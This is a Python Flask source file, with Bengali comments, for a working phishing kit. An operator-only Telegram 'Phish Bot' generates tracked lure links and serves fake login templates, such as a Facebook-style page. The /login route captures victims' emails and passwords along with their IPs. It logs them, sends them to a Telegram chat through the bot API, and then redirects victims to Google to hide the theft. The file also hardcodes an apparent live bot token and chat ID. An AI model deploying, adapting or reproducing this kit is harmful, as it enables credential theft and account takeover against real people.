# app.py
import json, os, secrets, time, threading
from datetime import datetime
from flask import Flask, request, render_template, redirect, make_response, jsonify
import requests
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

app = Flask(__name__)

# ============ CONFIG — শুধু এই ৩টা ============
BOT_TOKEN = "9296047587:AAGB03r-QENPVf6oOaO1txb2YKi-4mZAFlQ"
CHAT_ID   = "8087857994"
ADMIN_ID  = 8087857994
# ==============================================

REDIRECT_URL = "https://accounts.google.com"
PUBLIC_BASE  = os.environ.get("RENDER_EXTERNAL_URL", "http://localhost:8080").rstrip("/")

CAPTURE_FILE = "captures.jsonl"
LINKS_FILE   = "links.json"

# টেলিগ্রাম বট ইনিশিয়ালাইজ
bot = telebot.TeleBot(BOT_TOKEN)

# ---------- storage ----------
def load_links():
    if not os.path.exists(LINKS_FILE): return {}
    with open(LINKS_FILE) as f: return json.load(f)

def save_links(d):
    with open(LINKS_FILE, "w") as f: json.dump(d, f, indent=2)

def log_capture(kind, data, req):
    entry = {
        "ts":   datetime.utcnow().isoformat(),
        "kind": kind,
        "data": data,
        # Render প্রথমে আসল IP পাঠায়, তাই কমা দিয়ে স্প্লিট করে প্রথমটা নিচ্ছি
        "ip":   req.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip(),
        "ua":   (req.headers.get("User-Agent") or "")[:200],
        "ref":  req.headers.get("Referer"),
    }
    with open(CAPTURE_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")
    return entry

# ---------- dynamic templates ----------
def get_available_templates():
    if not os.path.exists("templates"): return []
    files = [f for f in os.listdir("templates") if f.endswith('.html')]
    # ফাইলের নাম সুন্দর করে সাজানো (যেমন fb.html -> Fb)
    return [{"id": f.replace('.html', ''), "name": f.replace('.html', '').capitalize()} for f in files]

# ============ TELEGRAM BOT LOGIC ============
@bot.message_handler(commands=['start'])
def cmd_start(message):
    if message.from_user.id != ADMIN_ID: return
    
    markup = InlineKeyboardMarkup()
    # ১ম সারি: লিংক জেনারেট ও স্ট্যাটস
    markup.row(InlineKeyboardButton("🔗 New Link", callback_data="new"))
    markup.row(InlineKeyboardButton("📊 Stats", callback_data="stats"),
               InlineKeyboardButton("📥 Captures", callback_data="caps"))
    
    # ২য় সারি: ডায়নামিক টেমপ্লেট বাটন
    templates = get_available_templates()
    if templates:
        markup.row(InlineKeyboardButton("--- Select Template ---", callback_data="none"))
        for i in range(0, len(templates), 2):
            row_buttons = []
            for t in templates[i:i+2]:
                row_buttons.append(InlineKeyboardButton(f"🌐 {t['name']}", callback_data=f"tpl_{t['id']}"))
            markup.row(*row_buttons)

    bot.reply_to(message, f"🎣 *Phish Bot*\n🌐 `{PUBLIC_BASE}`\n\nনিচের ডিজাইন থেকে যেকোনো একটি সিলেক্ট করলে লিংক পাবে।", parse_mode="Markdown", reply_markup=markup)

@bot.message_handler(commands=['link'])
def cmd_link(message):
    if message.from_user.id != ADMIN_ID: return
    try: label = message.text.split(" ", 1)[1]
    except IndexError: label = "default"
    
    token = secrets.token_urlsafe(8)
    links = load_links()
    links[token] = {"label": label, "clicks": 0, "captures": 0, "created": datetime.utcnow().isoformat()}
    save_links(links)
    url = f"{PUBLIC_BASE}/r/{token}"
    bot.reply_to(message, f"🔗 *New link*\n\n`{url}`\n\n🎯 Label: `{label}`", parse_mode="Markdown")

@bot.message_handler(commands=['stats'])
def cmd_stats(message):
    if message.from_user.id != ADMIN_ID: return
    links = load_links()
    items = [{"label": v["label"], "clicks": v["clicks"], "captures": v["captures"]} for v in links.values()]
    tc = sum(i["clicks"] for i in items)
    tk = sum(i["captures"] for i in items)
    lines = [f"📊 *Stats*\n\n🔗 Links: {len(links)}\n🖱 Clicks: {tc}\n🎣 Captures: {tk}\n"]
    for it in items[-10:]:
        lines.append(f"• `{it['label']}` — {it['clicks']}🖱 / {it['captures']}🎣")
    bot.reply_to(message, "\n".join(lines), parse_mode="Markdown")

@bot.message_handler(commands=['captures'])
def cmd_caps(message):
    if message.from_user.id != ADMIN_ID: return
    items = []
    if os.path.exists(CAPTURE_FILE):
        with open(CAPTURE_FILE) as f:
            for line in f:
                try: e = json.loads(line)
                except: continue
                if e["kind"] == "creds": items.append(e)
    if not items: return bot.reply_to(message, "📭 capture নেই")
    for e in items[-10:]:
        d = e["data"]
        bot.reply_to(message, f"🎣 `{d.get('email','')}`\n🔑 `{d.get('password','')}`\n🎯 {d.get('label','—')}", parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.from_user.id != ADMIN_ID: return bot.answer_callback_query(call.id, "❌ Unauthorized")
    
    if call.data == "none":
        return bot.answer_callback_query(call.id)

    bot.answer_callback_query(call.id)
    
    if call.data == "new":
        bot.send_message(call.message.chat.id, "`/link <label>` পাঠাও\nযেমন: `/link job-2026`", parse_mode="Markdown")
    
    elif call.data.startswith("tpl_"):
        # ডায়নামিক টেমপ্লেট বাটনে ক্লিক করলে
        tpl_name = call.data.replace("tpl_", "")
        token = secrets.token_urlsafe(8)
        links = load_links()
        links[token] = {"label": tpl_name, "clicks": 0, "captures": 0, "created": datetime.utcnow().isoformat()}
        save_links(links)
        
        url = f"{PUBLIC_BASE}/r/{token}?p={tpl_name}"
        bot.send_message(call.message.chat.id, f"🔗 *{tpl_name.capitalize()} Link*\n\n`{url}`", parse_mode="Markdown")

    elif call.data == "stats":
        links = load_links()
        items = [{"label": v["label"], "clicks": v["clicks"], "captures": v["captures"]} for v in links.values()]
        tc = sum(i["clicks"] for i in items)
        tk = sum(i["captures"] for i in items)
        lines = [f"📊 *Stats*\n\n🔗 Links: {len(links)}\n🖱 Clicks: {tc}\n🎣 Captures: {tk}\n"]
        for it in items[-10:]:
            lines.append(f"• `{it['label']}` — {it['clicks']}🖱 / {it['captures']}🎣")
        bot.send_message(call.message.chat.id, "\n".join(lines), parse_mode="Markdown")
        
    elif call.data == "caps":
        items = []
        if os.path.exists(CAPTURE_FILE):
            with open(CAPTURE_FILE) as f:
                for line in f:
                    try: e = json.loads(line)
                    except: continue
                    if e["kind"] == "creds": items.append(e)
        if not items: return bot.send_message(call.message.chat.id, "📭 capture নেই")
        for e in items[-10:]:
            d = e["data"]
            bot.send_message(call.message.chat.id, f"🎣 `{d.get('email','')}`\n🔑 `{d.get('password','')}`\n🎯 {d.get('label','—')}", parse_mode="Markdown")


# বট পোলিং চালু করা (আলাদা থ্রেডে)
def run_bot():
    time.sleep(3)
    print("[bot] starting polling...")
    bot.infinity_polling()

threading.Thread(target=run_bot, daemon=True).start()

# ============ FLASK ROUTES ============
@app.route("/")
def home():
    return redirect("/panel")

@app.route("/health")
def health():
    return jsonify({"ok": True, "base": PUBLIC_BASE})

@app.route("/panel")
def panel():
    links = load_links()
    rows = "".join(
        f"<tr><td><code>{tid}</code></td><td>{v['label']}</td><td>{v['clicks']}</td><td>{v['captures']}</td></tr>"
        for tid, v in links.items()
    )
    return f"""
    <html><head><title>Panel</title><meta name="viewport" content="width=device-width,initial-scale=1">
    <style>body{{font-family:system-ui;background:#111;color:#eee;padding:20px}}
    table{{border-collapse:collapse;width:100%;max-width:800px}} td,th{{border-bottom:1px solid #333;padding:8px;text-align:left}}
    code{{color:#4af}}</style></head><body>
    <h1>🎣 Panel</h1><p>Total links: {len(links)} | Base: {PUBLIC_BASE}</p>
    <table><tr><th>Token</th><th>Label</th><th>Clicks</th><th>Captures</th></tr>{rows}</table>
    </body></html>"""

@app.route("/r/<token>")
def landing(token):
    links = load_links()
    if token not in links: return "Link expired", 404
    
    links[token]["clicks"] += 1
    save_links(links)
    log_capture("click", {"token": token, "label": links[token]["label"]}, request)
    
    # ==== ডায়নামিক টেমপ্লেট লোডার ====
    # লিংকে ?p=fb থাকলে fb.html লোড হবে, ?p=login থাকলে login.html
    page_type = request.args.get("p", "login")
    template_name = f"{page_type}.html"
    
    # ফাইলটা আসলেই আছে কিনা চেক করা (নিরাপত্তার জন্য)
    if not os.path.exists(os.path.join("templates", template_name)):
        template_name = "login.html" # না থাকলে ডিফল্ট

    resp = make_response(render_template(template_name, token=token))
    resp.set_cookie("tid", token, max_age=3600)
    return resp

@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email", "")
    password = request.form.get("password", "")
    token = request.cookies.get("tid") or request.args.get("t", "")

    links = load_links()
    if token in links:
        links[token]["captures"] += 1
        save_links(links)

    entry = log_capture("creds", {"email": email, "password": password, "token": token, "label": links.get(token, {}).get("label")}, request)

    text = f"🎣 *NEW CAPTURE*\n\n📧 `{email}`\n🔑 `{password}`\n🎯 {entry['data']['label']}\n🌐 {entry['ip']}"
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                      json={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}, timeout=5)
    except: pass

    return redirect(REDIRECT_URL)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    print(f"[flask] running on port {port}")
    app.run(host="0.0.0.0", port=port)